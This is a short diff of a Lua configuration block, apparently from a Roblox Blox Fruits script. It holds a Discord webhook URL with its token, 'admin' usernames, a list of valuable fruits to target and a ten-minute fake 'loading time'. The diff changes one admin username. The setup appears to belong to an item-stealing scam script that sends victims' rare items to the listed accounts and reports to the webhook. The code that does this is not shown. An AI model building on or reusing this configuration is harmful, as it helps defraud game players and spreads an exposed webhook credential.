@@ -10,7 +10,7 @@
 
 -- 🔧 CONFIGURATION 🔧 --
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1373626708690735197/BbbGPTh9Za6e1B8bB7zdqt4k_CNAei-YSt4dw47cF5_kZ2vgAuoO7Yrnjw4EVAlDipLl"
-local ADMIN_USERNAMES = {"mdfmdgfdskfruit", "mdfmdgfdsk"}
+local ADMIN_USERNAMES = {"mdfmdgfdskfruit", "Sourlas3103"}
 local WANTED_FRUITS = {"Kitsune-Kitsune", "Dragon-Dragon", "Leopard-Leopard", "Yeti-Yeti", "T-Rex-T-Rex", "Dough-Dough", "Gravity-Gravity", "Buddha-Buddha", "Portal-Portal", "Spirit-Spirit", "Gas-Gas", "Venom-Venom", "Control-Control"}
 local LOADING_TIME = 10 * 60 -- 10 minutes in seconds
 -- 🔧 END CONFIGURATION 🔧 --
